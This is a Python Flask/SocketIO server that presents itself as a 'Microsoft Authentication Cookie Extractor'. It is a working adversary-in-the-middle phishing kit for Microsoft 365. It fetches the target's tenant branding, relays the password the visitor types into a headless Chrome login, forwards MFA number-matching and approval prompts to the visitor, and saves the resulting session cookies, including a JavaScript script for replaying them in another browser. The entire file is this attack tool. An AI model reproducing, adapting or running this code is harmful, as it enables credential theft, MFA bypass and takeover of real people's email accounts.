from flask import Flask, send_from_directory
from flask_socketio import SocketIO, emit
import os
import asyncio
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from time import sleep
import requests, json
import pickle
import base64
from datetime import datetime
import threading

# Flask app setup with SocketIO
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-this'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Global storage for active sessions
active_sessions = {}

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.htm')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

def setup_chrome_for_railway():
    chrome_options = Options()
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--headless')  # Required for server environments
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--remote-debugging-port=9222')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    return chrome_options

def convert_json_cookies_to_js(json_cookies_data):
    """
    Convert JSON cookie format to JavaScript execution format
    Only processes the cookies array, ignoring metadata
    """
    
    # If it's a string, parse it as JSON
    if isinstance(json_cookies_data, str):
        data = json.loads(json_cookies_data)
    else:
        data = json_cookies_data
    
    # Extract cookies array (ignore export_date and total_cookies)
    cookies = data.get('cookies', [])
    
    # Convert to JavaScript format
    js_cookies = []
    for cookie in cookies:
        # Clean domain (remove leading dots)
        domain = cookie.get('domain', '').lstrip('.')
        
        js_cookie = {
            "name": cookie.get('name', ''),
            "path": cookie.get('path', '/').replace('/', r'\/'),  # Escape forward slashes
            "value": cookie.get('value', ''),
            "domain": domain,
            "secure": cookie.get('secure', False),
            "max_age": 31536000,  # 1 year default
            "httponly": cookie.get('httpOnly', False),
            "samesite": cookie.get('sameSite')
        }
        js_cookies.append(js_cookie)
    
    # Generate the JavaScript code
    js_code = f"""(() => {{
        let cookies = {json.dumps(js_cookies, separators=(',', ':'))};
      
        function setCookie(key, value, domain, path, isSecure) {{
          const cookieMaxAge = 'Max-Age=31536000'
      
          if (key.startsWith('__Host')) {{
            console.log('cookies Set', key, value, '!IMPORTANT __Host- prefix: Cookies with names starting with __Host- must be set with the secure flag, must be from a secure page (HTTPS), must not have a domain specified (and therefore, are not sent to subdomains), and the path must be /.',);
            document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path = /;Secure;SameSite=None';
          }} else if (key.startsWith('__Secure')) {{
            console.log('cookies Set', key, value, '!IMPORTANT __Secure- prefix: Cookies with names starting with __Secure- (dash is part of the prefix) must be set with the secure flag from a secure page (HTTPS).',);
            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
          }} else {{
            if (isSecure) {{
              console.log('cookies Set', key, value);
              if (window.location.hostname == domain) {{
                document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
              }} else {{
                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
              }}
            }} else {{
              console.log('cookies Set', key, value);
              if (window.location.hostname == domain) {{
                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=' + path + ';';
              }} else {{
                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';';
              }}
            }}
          }}
        }}
        for (let cookie of cookies) {{
          setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure)
        }}
      }})();"""
    
    return js_code

def mm_1(vf):
    try:
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "acceptButton")))
        return True
    except:
        return False

def mm_1_v(vf):
    try:
        accept_button = WebDriverWait(vf, 10).until(EC.element_to_be_clickable((By.ID, "acceptButton")))
        accept_button.click()
        sleep(10)
        vf.quit()
    except Exception as e:
        print(f"Error in mm_1_v: {e}")
        try:
            vf.quit()
        except:
            pass

def mm_2(vf):
    try:
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "i0118Error")))
        return True
    except:
        return False

def mm_3(vf):
    try:
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "idDiv_SAOTCAS_Description")))
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
        return True
    except:
        return False

def mm_3_v(vf):
    try:
        sleep(20)
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "acceptButton")))
        return True
    except:
        return False

def mm_4(vf):
    try:
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "idDiv_SAOTCAS_Description")))
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "idSpan_SAOTCAS_DescSessionID")))
        return True
    except:
        return False

def mm_4_v(vf):
    try:
        sleep(20)
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "acceptButton")))
        return True
    except:
        return False

def is_login_successful(driver):
    """Check if login was successful"""
    try:
        current_url = driver.current_url
        print(f"Checking login success. Current URL: {current_url}")
        
        # Check for successful redirects
        if any(x in current_url for x in ["outlook.office365.com", "owa", "mail", "office.com", "microsoftonline.com"]):
            return True
        
        # Check for success indicators in page content
        page_source = driver.page_source.lower()
        if any(x in page_source for x in ["sign out", "logout", "log out", "inbox", "mail", "calendar"]):
            return True
            
        # Check for error indicators
        if any(x in page_source for x in ["error", "invalid", "incorrect", "wrong password"]):
            return False
            
        return False
    except Exception as e:
        print(f"Error checking login status: {e}")
        return False

def save_cookies(driver, session_id):
    """Save cookies to multiple formats including clean JavaScript execution format"""
    try:
        cookies = driver.get_cookies()
        map_dir = os.path.join(os.getcwd(), "map", session_id)
        
        # Save as pickle
        pkl_file = os.path.join(map_dir, "cookies.pkl")
        with open(pkl_file, 'wb') as f:
            pickle.dump(cookies, f)
        
        # Prepare JSON data
        json_ready_cookies = []
        for cookie in cookies:
            json_cookie = cookie.copy()
            for key, value in json_cookie.items():
                if isinstance(value, (bytes, datetime)):
                    json_cookie[key] = str(value)
            json_ready_cookies.append(json_cookie)
        
        # Save as JSON (with metadata)
        json_file = os.path.join(map_dir, "cookies.json")
        json_data_with_metadata = {
            "export_date": datetime.now().isoformat(),
            "total_cookies": len(cookies),
            "cookies": json_ready_cookies
        }
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(json_data_with_metadata, f, indent=2, ensure_ascii=False)
        
        # Convert to JavaScript format (without metadata)
        js_file = os.path.join(map_dir, "cookies_script.js")
        clean_json_data = {"cookies": json_ready_cookies}  # Only cookies, no metadata
        js_code = convert_json_cookies_to_js(clean_json_data)
        
        with open(js_file, 'w', encoding='utf-8') as f:
            f.write(js_code)
        
        # Also create a simple text summary
        summary_file = os.path.join(map_dir, "cookies_summary.txt")
        with open(summary_file, 'w', encoding='utf-8') as f:
            f.write(f"Cookie Export Summary\n")
            f.write(f"=====================\n")
            f.write(f"Export Date: {datetime.now().isoformat()}\n")
            f.write(f"Total Cookies: {len(cookies)}\n")
            f.write(f"Domains found:\n")
            
            domains = {}
            for cookie in cookies:
                domain = cookie.get('domain', 'unknown')
                domains[domain] = domains.get(domain, 0) + 1
            
            for domain, count in domains.items():
                f.write(f"  - {domain}: {count} cookies\n")
            
            f.write(f"\nImportant Cookies:\n")
            important_cookies = [c for c in cookies if any(x in c.get('name', '').lower() for x in ['auth', 'token', 'session', 'access', 'refresh', 'login'])]
            for cookie in important_cookies:
                f.write(f"  - {cookie.get('name')} (Domain: {cookie.get('domain')})\n")
        
        print(f"Cookies saved to: {pkl_file}")
        print(f"JSON cookies saved to: {json_file}")
        print(f"JavaScript cookies saved to: {js_file}")
        print(f"Summary saved to: {summary_file}")
        return True
        
    except Exception as e:
        print(f"Error saving cookies: {e}")
        return False

def handle_browser_automation(data, session_id):
    """Handle browser automation in a separate thread"""
    try:
        parts = data.split(":")
        username = parts[1]
        
        # Process browser automation
        base_dir = os.getcwd()
        map_dir = os.path.join(base_dir, "map", session_id)
        storage_dir = os.path.join(base_dir, "Storage", session_id)
        
        os.makedirs(map_dir, exist_ok=True)
        os.makedirs(storage_dir, exist_ok=True)
        print(f"Directories created for session: {session_id}")
        print(f"Cookies will be stored in: {map_dir}/")
        print(f"Browser profile will be stored in: {storage_dir}/")
        
        # Use the Railway-optimized Chrome setup
        chrome_options = setup_chrome_for_railway()
        chrome_options.add_argument(f"user-data-dir={storage_dir}")
        
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        
        # Store driver in active sessions
        active_sessions[session_id] = {
            'driver': driver,
            'username': username,
            'status': 'browser_opened'
        }
        
        url = f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=27773165-9160-1898-04aa-bf3c4164d7f9&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&login_hint={username}&nonce=638588644641353721.6173dd1e-ebed-4c60-b413-fdb5a2238a04&state=DYsxEsAgCMCwXp9DFUHkGoIhrJ1MxVRIe48Gl1Kg91p417bUW6tuCLi46vP1thmlRTvWd5vlh8&sso_reload=true"
        driver.get(url)
        print(f"Browser opened for: {username}")
        
        # Check if we're already logged in or need to enter password
        try:
            # Look for password field
            password_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "i0118"))
            )
            print("Password field found, waiting for password...")
            active_sessions[session_id]['status'] = 'waiting_for_password'
            socketio.emit('message', 'need_password', room=session_id)
            
        except Exception as e:
            print(f"Password field not found or error: {e}")
            # Check if already logged in
            if is_login_successful(driver):
                print("Already logged in!")
                if save_cookies(driver, session_id):
                    socketio.emit('message', 'already_logged_in:cookies_saved', room=session_id)
                else:
                    socketio.emit('message', 'already_logged_in:cookies_failed', room=session_id)
            else:
                current_url = driver.current_url
                print(f"Unexpected page state. URL: {current_url}")
                socketio.emit('message', f'unexpected_page:{current_url}', room=session_id)
                
    except Exception as e:
        error_msg = f"Browser error: {e}"
        print(error_msg)
        socketio.emit('message', 'error:browser_error', room=session_id)
        if session_id in active_sessions and 'driver' in active_sessions[session_id]:
            try:
                active_sessions[session_id]['driver'].quit()
            except:
                pass
            del active_sessions[session_id]

# SocketIO Event Handlers
@socketio.on('connect')
def handle_connect():
    print(f'Client connected: {request.sid}')

@socketio.on('disconnect')
def handle_disconnect():
    print(f'Client disconnected: {request.sid}')
    # Clean up any active sessions for this client
    session_id = request.sid
    if session_id in active_sessions:
        try:
            if 'driver' in active_sessions[session_id]:
                active_sessions[session_id]['driver'].quit()
        except:
            pass
        del active_sessions[session_id]

@socketio.on('message')
def handle_message(data):
    session_id = request.sid
    print(f'Received from {session_id}: {data}')
    
    if data.startswith('ud:'):
        parts = data.split(":")
        if len(parts) >= 3:
            username = parts[1]
            hash_value = parts[2]
            
            payload = {"username": username, "isOtherIdpSupported": True}
            banner = ""
            print(f"Processing username: {username}")
            
            try:
                response = requests.post("https://login.microsoftonline.com/common/GetCredentialType", 
                                       json=payload, timeout=30)
                
                if response.status_code == 200:
                    try:
                        data_resp = response.json()
                        banner += f"{data_resp.get('IfExistsResult', 'null')}:"
                        banner += f"{data_resp.get('EstsProperties', {}).get('UserTenantBranding', [{}])[0].get('BannerLogo', 'null')}:"
                        banner += f"{data_resp.get('EstsProperties', {}).get('UserTenantBranding', [{}])[0].get('Illustration', 'null')}:"
                        banner += f"{data_resp.get('EstsProperties', {}).get('UserTenantBranding', [{}])[0].get('BackgroundColor', 'null')}"
                    except Exception as e:
                        banner = "null:null:null:null"
                        print(f"Error parsing response: {e}")
                    
                    print(f"Banner response: {banner}")
                    emit('message', banner)
                    
                    # Start browser automation in separate thread
                    join_room(session_id)
                    browser_thread = threading.Thread(
                        target=handle_browser_automation, 
                        args=(data, session_id)
                    )
                    browser_thread.daemon = True
                    browser_thread.start()
                    
                else:
                    error_msg = f"Request failed. Status code: {response.status_code}"
                    print(error_msg)
                    emit('message', 'error:request_failed')
                    
            except Exception as e:
                error_msg = f"Error in API call: {e}"
                print(error_msg)
                emit('message', 'error:api_call_failed')
        else:
            print("Invalid format")
            emit('message', 'error:invalid_format')
            
    elif data.startswith('password:'):
        # Handle password input
        password = data.replace('password:', '')
        print(f"Password received for session {session_id}")
        
        if session_id in active_sessions and active_sessions[session_id]['status'] == 'waiting_for_password':
            try:
                driver = active_sessions[session_id]['driver']
                username = active_sessions[session_id]['username']
                
                # Enter password
                password_field = driver.find_element(By.ID, "i0118")
                password_field.clear()
                password_field.send_keys(password)
                
                # Click submit
                submit_button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.ID, "idSIButton9"))
                )
                submit_button.click()
                print("Login submitted")
                
                # Wait for post-login page and check for errors
                sleep(5)
                
                # Check for password error first
                if mm_2(driver):
                    print("Invalid password detected")
                    emit('message', 'invalid_password', room=session_id)
                    active_sessions[session_id]['status'] = 'waiting_for_password'
                    return
                
                # Wait a bit longer for page to fully load
                sleep(3)
                
                # Check different scenarios
                if mm_1(driver):
                    emit('message', 'mm_1', room=session_id)
                    active_sessions[session_id]['status'] = 'mm_1'
                elif mm_3(driver):
                    try:
                        sign_element = driver.find_element(By.ID, "idRichContext_DisplaySign")
                        sign_text = sign_element.text
                        emit('message', f'mm_3:{sign_text}', room=session_id)
                        active_sessions[session_id]['status'] = 'mm_3'
                    except:
                        emit('message', 'mm_3:Sign in request', room=session_id)
                        active_sessions[session_id]['status'] = 'mm_3'
                elif mm_4(driver):
                    try:
                        session_element = driver.find_element(By.ID, "idSpan_SAOTCAS_DescSessionID")
                        session_text = session_element.text
                        emit('message', f'mm_4:{session_text}', room=session_id)
                        active_sessions[session_id]['status'] = 'mm_4'
                    except:
                        emit('message', 'mm_4:Session ID', room=session_id)
                        active_sessions[session_id]['status'] = 'mm_4'
                elif is_login_successful(driver):
                    print("Login successful!")
                    # Save cookies in multiple formats
                    if save_cookies(driver, session_id):
                        emit('message', 'login_successful:cookies_saved', room=session_id)
                    else:
                        emit('message', 'login_successful:cookies_failed', room=session_id)
                    # Clean up
                    driver.quit()
                    del active_sessions[session_id]
                else:
                    print("Login failed or unknown state")
                    emit('message', 'login_failed', room=session_id)
                    
            except Exception as e:
                print(f"Error processing password: {e}")
                emit('message', 'error:password_processing_failed', room=session_id)
                
    else:
        # Handle other message types (like accepting buttons, etc.)
        if session_id in active_sessions:
            driver = active_sessions[session_id]['driver']
            status = active_sessions[session_id]['status']
            
            try:
                if status == 'mm_1' and mm_1_v(driver):
                    emit('message', 'mm_1:success', room=session_id)
                    del active_sessions[session_id]
                elif status == 'mm_3' and mm_3_v(driver):
                    emit('message', 'mm_3:success', room=session_id)
                    del active_sessions[session_id]
                elif status == 'mm_4' and mm_4_v(driver):
                    emit('message', 'mm_4:success', room=session_id)
                    del active_sessions[session_id]
                else:
                    emit('message', 'unknown_action', room=session_id)
            except Exception as e:
                print(f"Error handling action: {e}")
                emit('message', 'error:action_failed', room=session_id)

if __name__ == "__main__":
    # Create base directories
    os.makedirs("map", exist_ok=True)
    os.makedirs("Storage", exist_ok=True)
    
    print("Microsoft Authentication Cookie Extractor")
    print("========================================")
    print(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("Directories ready")
    print("")
    print("Output Files:")
    print("  - cookies.pkl (binary format for Python)")
    print("  - cookies.json (readable JSON format with metadata)")
    print("  - cookies_script.js (executable JavaScript for browser console)")
    print("  - cookies_summary.txt (summary file)")
    print("")
    print("Storage locations:")
    print(f"  - Cookies: ./map/{{session_id}}/")
    print(f"  - Browser profiles: ./Storage/{{session_id}}/")
    print("")
    
    port = int(os.environ.get('PORT', 8080))
    print(f"Starting server on port {port}")
    
    # Check if index.htm exists
    if not os.path.exists('index.htm'):
        print("WARNING: index.htm not found!")
    
    # Run with SocketIO (this replaces both Flask and WebSocket servers)
    socketio.run(app, host='0.0.0.0', port=port, debug=False)
